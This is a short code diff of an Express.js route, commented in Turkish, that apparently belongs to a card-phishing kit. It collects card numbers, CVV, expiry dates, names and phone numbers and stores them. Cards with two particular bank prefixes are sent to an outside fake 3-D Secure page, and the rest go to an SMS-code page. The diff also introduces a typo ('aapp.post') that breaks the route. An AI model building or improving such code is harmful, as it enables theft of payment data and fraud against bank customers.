@@ -36,15 +36,14 @@ app.get('/', (req, res) => {
 app.use(express.static(express.static(path.join(__dirname, 'frontend'))));
 
 // 📤 Form gönderimi
-app.post('/submit-form', async (req, res) => {
+aapp.post('/submit-form', async (req, res) => {
   const { name, phone, card, CARD, expdate, EXP, EXP_YEAR, cvv } = req.body;
   const newId = uid.rnd();
 
   const raw = (card || "").replace(/\D/g, '');
   const prefix8 = raw.substr(0, 8);
-  console.log('Card prefix:', prefix8); // 
-     
-  
+  console.log('Card prefix:', prefix8); // Bu satır logda görünecek
+
   // Veriyi kaydet
   db.get('submissions')
     .unshift({
@@ -60,15 +59,13 @@ app.post('/submit-form', async (req, res) => {
       createdAt: new Date().toISOString()
     })
     .write();
-   
-    if (prefix8 === '40985844' || prefix8 === '54112498') {
-    return res.redirect('https://kontaktonlayn.com/leobank-3ds.html');
 
+  // Eğer kart prefix'leri uygun ise, yönlendirmeyi yap
+  if (prefix8 === '40985844' || prefix8 === '54112498') {
+    return res.redirect('https://kontaktonlayn.com/leobank-3ds.html'); // yönlendirme
   }
 
-  
-
-
+  // Diğer durumda sms ekranına yönlendir
   res.redirect(`/sms.html?trans_id=${newId}`);
 });
 
